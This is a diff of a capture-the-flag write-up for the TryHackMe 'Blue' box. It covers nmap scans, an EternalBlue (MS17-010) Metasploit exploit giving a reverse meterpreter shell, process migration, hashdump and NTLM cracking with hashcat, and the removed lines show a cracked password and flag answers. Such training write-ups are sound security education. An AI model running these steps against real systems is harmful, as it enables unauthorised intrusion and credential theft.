@@ -1,88 +1,108 @@
-![](https://tryhackme-images.s3.amazonaws.com/room-icons/7717bbc69c486931e503a74f3192a4d8.gif)
+# Writeup for the Try_Hack_Me box - Blue. 
 
-This is my writeup for the Try_Hack_Me box - Blue.
-The box has Eternal Blue vulnerability. It is an easy box.
+The box has Eternal Blue (MS17-010) vulnerability which could be exploited to get on the box. It is an easy guided box.
 Has following sequels as Ice and Blaster. 
  
-> Pratyush Prakhar (Sh1nch@n010) - 10/30/2020
+> Pratyush Prakhar (5#1NC#4N) - 10/30/2020
 
-# RECON
+## RECON
 
-1. Scan the machine.
+1. Scan the machine using the favourite tool of all times - nmap.
 
 2. How many ports are open with a port number under 1000? - **3**
+	
+Ran a quick scan for the required port range (0-1000). \
 
-	1. Ran a quick scan for the required port range (0-1000) 
+```bash
+nmap -vv -p0-1000 -oN nmap/allport_scan.nmap 10.10.130.42**
+```
+**Output**
 
-	**nmap -vv -p0-1000 -oN nmap/allport_scan.nmap 10.10.130.42**
+```bash
+Nmap scan report for 10.10.130.42
+Host is up, received reset ttl 125 (0.19s latency).
+Scanned at 2020-10-29 01:39:50 EDT for 4s
+Not shown: 998 closed ports
+Reason: 998 resets
+PORT    STATE SERVICE      REASON
+135/tcp open  msrpc        syn-ack ttl 125
+139/tcp open  netbios-ssn  syn-ack ttl 125
+445/tcp open  microsoft-ds syn-ack ttl 125
+```
+\
+Then ran a standard scan - Default services and scripts on the determined specific ports**(135,139,445)** \
 
-	**Output**
-	`````
-	Nmap scan report for 10.10.130.42
-	Host is up, received reset ttl 125 (0.19s latency).
-	Scanned at 2020-10-29 01:39:50 EDT for 4s
-	Not shown: 998 closed ports
-	Reason: 998 resets
-	PORT    STATE SERVICE      REASON
-	135/tcp open  msrpc        syn-ack ttl 125
-	139/tcp open  netbios-ssn  syn-ack ttl 125
-	445/tcp open  microsoft-ds syn-ack ttl 125
-	`````
+```bash
+nmap -vv -p0-1000 -oN nmap/allport_scan.nmap 10.10.130.42
+```
+**Output**
 
-    2. Then ran a standard scan - Default services and scripts on the determined specific ports**(135,139,445)**
-
-    **nmap -vv -p0-1000 -oN nmap/allport_scan.nmap 10.10.130.42**
-
-    **Output**
-	`````
-	Nmap scan report for 10.10.130.42
-	Host is up, received reset ttl 125 (0.16s latency).
-	Scanned at 2020-10-29 01:51:13 EDT for 13s
-	PORT    STATE SERVICE      REASON          VERSION
-	135/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
-	139/tcp open  netbios-ssn  syn-ack ttl 125 Microsoft Windows netbios-ssn
-	445/tcp open  microsoft-ds syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
-	`````
+```bash
+Nmap scan report for 10.10.130.42
+Host is up, received reset ttl 125 (0.16s latency).
+Scanned at 2020-10-29 01:51:13 EDT for 13s
+PORT    STATE SERVICE      REASON          VERSION
+135/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
+139/tcp open  netbios-ssn  syn-ack ttl 125 Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+```
 
 3.  What is this machine vulnerable to? - **ms17-010**
 
-	1. Ran a nmap scan for finding the known vulnerabilities
+Ran a nmap scan for finding the known vulnerabilities. \
 
-	**nmap -vv -p135,139,445 --script vuln -oN nmap/vulnub.nmap 10.10.130.42**
+```bash
+nmap -vv -p135,139,445 --script vuln -oN nmap/vulnub.nmap 10.10.130.42
+```
 
-    **Output**
-	`````
-	Host script results:
-	|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
-	|_smb-vuln-ms10-054: false
-	|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
-	| smb-vuln-ms17-010: 
-	|   VULNERABLE:
-	|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
-	|     State: VULNERABLE
-	|     IDs:  CVE:CVE-2017-0143
-	|     Risk factor: HIGH
-	|       A critical remote code execution vulnerability exists in Microsoft SMBv1
-	|        servers (ms17-010).
-	|           
-	|     Disclosure date: 2017-03-14
-	|     References:
-	|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
-	|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
-	|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
-	`````
+**OUTPUT**
 
+```bash
+Host script results:
+|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+```
 
-# GAIN ACCESS
+## GAIN ACCESS
 
-1. Start Metasploit
+1. Start Metasploit. One can doing it by simply _msfconsole_ command. But there is a better way to load the _msfdb_ first to have faster access. Metasploit is a great tool. Use it like any other. Doesn't make you a script kiddie :)
 
-2. Find the exploitation code we will run against the machine. What is the full path of the code? - **exploit/windows/smb/ms17_010_eternalblue**
+```bash
+$ sudo msfdb init
+[+] Starting database
+[+] Creating database user 'msf'
+[+] Creating databases 'msf'
+[+] Creating databases 'msf_test'
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+[+] Creating initial database schema
+$ sudo msfdb run
+[i] Database already started
 
-	We use the _eternalblue_ one but actually the _psexec_ is the **most stable** verion of the exploit. It should be used in normall scenerios.
+msf5 > 
+```
 
-**Output**
-`````
+2. Find the exploitation code we will run against the machine. What is the full path of the code? - **exploit/windows/smb/ms17_010_eternalblue** \
+
+We use the _eternalblue_ one but actually the _psexec_ is the **most stable** verion of the exploit. It should be used in normall scenerios. \
+
+**OUTPUT**
+
+```bash
 msf5 > search ms17-010
 
 Matching Modules
@@ -95,15 +115,14 @@ Matching Modules
 2  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
 3  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
 4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
-`````
+```
 
-3. Show options and set the one required value. What is the name of this value? - **RHOSTS**
+3. Show options and set the one required value. What is the name of this value? - **RHOSTS** \
 
-	_RHOSTS_ is the only flag required and not set. One can make additional chages to flags like _LHOST_ and _PAYLOAD_.
-	We set RHOST to $BOX_IP and run the exoplit. I also set my _LPORT_ to 9999.
+_RHOSTS_ is the only flag required and not set. One can make additional chages to flags like _LHOST_ and _PAYLOAD_. We set RHOST to $BOX_IP and run the exoplit. I also set my _LPORT_ to 9999. \
 
 **OUTPUT**
-`````
+```bash
 msf5 > use 2
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
 
@@ -116,12 +135,13 @@ Name           Current Setting  Required  Description
 RHOSTS                        **yes**       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
 RPORT          445              yes       The target port (TCP)
 SMBDomain      .                no        (Optional) The Windows domain to use for authentication
-`````
+```
 
 4. Run the exploit! - **SUCCESS**
 
 **OUTPUT**
-`````
+
+```bash
 [*] Started reverse TCP handler on 10.2.44.183:9999
 [*] 10.10.190.61:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
 [+] 10.10.190.61:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
@@ -150,11 +170,11 @@ SMBDomain      .                no        (Optional) The Windows domain to use f
 [+] 10.10.190.61:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 [+] 10.10.190.61:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 [+] 10.10.190.61:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-`````
+```
 
-5. Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z)
+5. Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). 
 
-`````
+```bash
 msf5 exploit(windows/smb/ms17_010_eternalblue) > sessions
 
 Active sessions
@@ -164,14 +184,15 @@ Id  Name  Type                     Information                   Connection
 --  ----  ----                     -----------                   ----------
 1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.2.44.183:9999 -> 10.10.190.61:49169 (10.10.190.61)
 
-`````
+```
+\
+We see we have indeed backgrounded our session.
 
+## ESCLATE
 
-# ESCLATE
+1. Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? - **post/multi/manage/shell_to_meterpreter**
 
-1. Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? - **post/multi/manage/shell_to_       	meterpreter**
-
-`````
+```bash
 msf5 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter
 
 Matching Modules
@@ -180,11 +201,11 @@ Matching Modules
 #  Name                                    Disclosure Date  Rank    Check  Description
 -  ----                                    ---------------  ----    -----  -----------
 0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
-`````
+```
 
 2. Select this (use MODULE_PATH). Show options, what option are we required to change? - **SESSION**
 
-`````
+```bash
 msf5 post(multi/manage/shell_to_meterpreter) > options
 
 Module options (post/multi/manage/shell_to_meterpreter):
@@ -198,11 +219,11 @@ Module options (post/multi/manage/shell_to_meterpreter):
 
 msf5 post(multi/manage/shell_to_meterpreter) > set session 1
 
-`````
+```
 
 6. Verify that we have escalated to NT AUTHORITY\SYSTEM. - **SUCCESS**
 
-`````
+```ps
 meterpreter > shell
 Process 2212 created.
 Channel 6 created.
@@ -212,11 +233,11 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\Windows\system32>whoami
 whoami
 nt authority\system
-`````
+```
 
 7. List all of the processes running via the 'ps' command. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id. - **2828**
 
-`````
+```bash
 meterpreter > ps
 
 Process List
@@ -230,59 +251,63 @@ Process List
  2708  696   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\sppsvc.exe
  2756  696   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
  2828  696   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchIndexer.exe
-`````
+```
 
 8. Migrate to this process. - **SUCCESS**
 
-`````
+```sh
 meterpreter > migrate 2828
 [*] Migrating from 2756 to 2828...
 [*] Migration completed successfully.
-`````
+```
 
 # CRACKING
 
 1. Within our elevated meterpreter shell, run the command 'hashdump'. What is the name of the non-default user? - **Jon**
 
-`````
+```bash
 meterpreter > hashdump
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0894c0:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
-`````
+Administrator:***************************************************************:::
+Guest::***************************************************************:::
+Jon::***************************************************************:::
+```
+\
+We can now use _hashcat or johntheripper_ to crack them with correct mode and wordlist.
 
 2. What is the cracked password?
 
-	The acquired hashes are **raw LANMAN/NTLM hashes**. The fourth field consist of the NTLM hash. We can use hascat to crack them with the following cmd.
-	**hashcat -m 1000 -a 3 hashes /opt/rockyou.txt**. The NTLM hashes are stored in hashes file. dictiory used is rockyou.txt.
+The acquired hashes are **raw LANMAN/NTLM hashes**. The fourth field consist of the NTLM hash. We can use hascat to crack them with the following cmd.
+```bash
+hashcat -m 1000 -a 3 hashes /opt/rockyou.txt
+```
+\
+The NTLM hashes are stored in hashes file. Dictionary used is rockyou.txt. 
 
-**Cracked Output**
-`````
-ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22
-`````
+## FLAGS
 
-# FLAGS
+1. Flag1? - **Stored in C:\ dir**
 
-1. Flag1? - **Stroed in C:\ dir**
-
-`````
+```ps
 c:\>type flag1.txt
 type flag1.txt
-flag{access_the_machine}
-`````
+```
 
 2. Flag2? - **All local user account passwords are stored inside windows in C:\windows\system32\config\SAM dir**
 
-````
+```ps
 c:\Windows\System32\config>type flag2.txt
 type flag2.txt
-flag{sam_database_elevated_access}
-`````
+```
 
 3. Flag3? -  **In Jon's home dir**
 
-`````
- c:\Users\Jon\Documents>type flag3.txt
+```ps
+c:\Users\Jon\Documents>type flag3.txt
 type flag3.txt
-flag{admin_documents_can_be_valuable}
-`````
+```
+\
+
+We can mark the box complete now after submitting allt he flags. Onto the next challenge !! \
+
+Stay Tuned On\
+[![alt text](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/Github.png)](https://github.com/pratty010/Boxes)   [![alt text](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr_Robot_CTF/images/LinkedIn.png)](https://www.linkedin.com/in/pratyush-prakhar/)
